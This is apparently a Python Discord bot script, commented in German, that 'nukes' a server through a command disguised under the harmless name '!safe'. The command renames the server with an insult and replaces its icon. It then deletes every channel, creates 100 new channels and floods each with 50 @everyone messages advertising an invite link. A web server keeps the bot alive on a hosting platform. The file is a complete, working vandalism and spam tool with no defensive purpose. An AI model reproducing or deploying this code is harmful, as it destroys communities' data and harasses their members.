import discord
from discord.ext import commands
import asyncio
import aiohttp
from aiohttp import web
import os

BOT_TOKEN = os.getenv("BOT_TOKEN")  # Sichere Nutzung über Umgebungsvariable

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command(name="safe")
async def reset_channels(ctx):
    guild = ctx.guild
    try:
        await guild.edit(name="FUCKED BY VSB IHR BITCHES!")
        with open("icon_nuke.jpeg", "rb") as icon_file:
            await guild.edit(icon=icon_file.read())
        print("✅ Servername und Icon geändert.")
    except Exception as e:
        print(f"❌ Fehler beim Bearbeiten des Servers: {e}")

    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    create_tasks = [guild.create_text_channel(name="error-67") for _ in range(100)]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    new_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]

    async def spam(channel):
        for _ in range(50):
            try:
                await channel.send("Fucked by VSB! Womp Womp! Error 67! @everyone https://discord.gg/e8mb6X9h")
            except Exception as e:
                print(f"Fehler in {channel.name}: {e}")

    await asyncio.gather(*(spam(c) for c in new_channels))

# Webserver für Render + UptimeRobot
async def handle(request):
    return web.Response(text="Bot is online!")

async def start_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port=int(os.getenv("PORT", 8080)))
    await site.start()

# Haupt-Startfunktion
async def main():
    await start_webserver()
    await bot.start(BOT_TOKEN)

asyncio.run(main())
